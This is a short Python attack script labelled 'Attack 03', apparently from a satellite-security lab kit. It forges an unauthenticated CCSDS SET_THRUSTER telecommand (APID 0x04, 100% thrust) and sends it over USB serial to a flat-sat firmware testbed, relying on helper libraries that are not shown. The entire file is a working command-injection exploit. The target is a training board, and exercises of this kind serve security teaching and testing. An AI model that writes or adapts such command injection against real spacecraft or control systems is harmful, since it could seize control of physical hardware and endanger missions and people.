#!/usr/bin/env python3
"""
Attack 03: Unauthenticated SET_THRUSTER Command Injection (USB Variant)
Sends unauthenticated SET_THRUSTER command (APID 0x04) over serial to flat-sat-fw-interno.
"""
import os
import sys
import time

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../lib")))
from flatsat_usb import FlatSatUSB
from pwnsat_packets import build_ccsds_packet

def main():
    print("[+] Attack 03: Unauthenticated SET_THRUSTER Command Injection (flat-sat-fw-interno USB Variant)")
    usb = FlatSatUSB()
    if not usb.connect():
        print("[X] Failed to connect to FlatSat USB port.")
        sys.exit(1)

    print("[*] Forging SET_THRUSTER telecommand (APID 0x04, thrust_power=100%)...")
    thruster_payload = b"\x01\x64"
    packet = build_ccsds_packet(apid=0x04, payload=thruster_payload)
    usb.send_raw(packet)
    print("[✓] Unauthenticated thruster command sent over USB. NeoPixel LED set to Yellow.")
    usb.close()

if __name__ == "__main__":
    main()
